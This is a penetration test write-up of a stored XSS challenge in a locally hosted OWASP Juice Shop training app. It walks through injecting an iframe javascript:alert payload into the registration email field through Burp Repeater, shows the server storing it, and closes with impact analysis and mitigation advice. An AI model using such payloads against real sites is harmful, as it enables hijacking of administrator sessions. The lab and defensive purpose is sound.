# 🛡️ Penetration Test Report – Client-side XSS Protection (Stored XSS via Registration)

## 1. Objective
The objective of this penetration test in OWASP Juice Shop was to demonstrate a Stored XSS vulnerability where an administrator, when viewing user input in the administration section, is presented with a JavaScript popup showing the message `xss`.

---

## 2. Scope
- **Target System:** OWASP Juice Shop – locally hosted 
- **Test Methodology:** Black-Box  
- **Test Period:** 18.08.2025 - 19.08.2025
- **Tools:** DevTools, Burp Suite (Proxy + Repeater)

---

## 3. Methodology
1. Navigate to the login page of OWASP Juice Shop: `http://127.0.0.1:3000/#/login`.
2. Create a new user by clicking on `Not yet a customer?` and filling out the registration form.
3. Important: Enter a valid email in the `Email` field first (e.g., `bob@gmail.com`) and click `Register`.
4. In Burp Suite, go to HTTP history and locate the POST request used to create the new user. Look for requests to `/api/Users`. In the request body, you should see something like:
``` JSON
{
    "email":"bob@gmail.com",
    "password":"hallo123",
    "passwordRepeat":"hallo123",
    "securityQuestion":{
        "id":7,
        "question":"Name of your favorite pet?",
        "createdAt":"2025-08-19T21:22:24.645Z",
        "updatedAt":"2025-08-19T21:22:24.645Z"
    },
    "securityAnswer":"zaya"
}
```
5. Right-click inside the request and select `Send to Repeater`. Then switch to the `Repeater` tab. Here we manipulate the JSON and insert our payload `<iframe src="javascript:alert('xss')">` into the `email` field:
``` JSON
"email": "<iframe src='javascript:alert(`xss`)'>"
```

6. Click `Send`. The response should confirm successful account creation:
``` JSON
HTTP/1.1 201 Created
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Location: /api/Users/24
Content-Type: application/json; charset=utf-8
Content-Length: 329
ETag: W/"149-GmvgsHBP7D/olaVrO92LkHEHCec"
Vary: Accept-Encoding
Date: Tue, 19 Aug 2025 21:54:12 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{
    "status":"success",
    "data":{
        "username":"",
        "role":"customer",
        "deluxeToken":"",
        "lastLoginIp":"0.0.0.0",
        "profileImage":"/assets/public/images/uploads/default.svg",
        "isActive":true,
        "id":24,
        "email":"<iframe src='javascript:alert(`xss`)'>",
        "updatedAt":"2025-08-19T21:54:11.986Z",
        "createdAt":"2025-08-19T21:54:11.986Z",
        "deletedAt":null
    }
}
```
7. Log in as admin and navigate to the administration page: `http://127.0.0.1:3000/#/administration`

8. If the steps were followed correctly, a popup with the text `xss` should appear.

---

## 4. Vulnerability Identified
- Stored XSS via the “Email” field during registration
- User input is stored unfiltered in the database.
- When displayed in the administration section, the data is rendered without protection, allowing JavaScript execution.

---

## 5. Risk Analysis / Impact
- Execution of arbitrary JavaScript in the administrator’s browser.
- Potential theft of session cookies, manipulation of admin views, or data exfiltration.
- Every maliciously created account can permanently trigger XSS when the admin section is accessed.

---

## 6. Recommendations 
- Input Validation (Frontend & Backend): Ensure only properly formatted email addresses are accepted. Validation must occur on the server, not just the client.
- Sanitize Input Before Storing: Strip HTML tags or JavaScript before saving data to the database.
- Secure Output Encoding: When displaying data (such as email addresses), ensure the browser interprets it as plain text, not HTML/JavaScript.
- Implement Content Security Policy (CSP): Even a simple CSP rule can mitigate execution of injected scripts.

---

## 7. Conclusion
The application is vulnerable to Stored XSS in the email field during registration.
By manipulating the request, a payload was successfully stored and executed automatically in the administration panel.
This vulnerability is critical, as it enables attackers to execute arbitrary code in the administrator’s browser.
Proper input validation, sanitization, and secure output handling would prevent this issue.


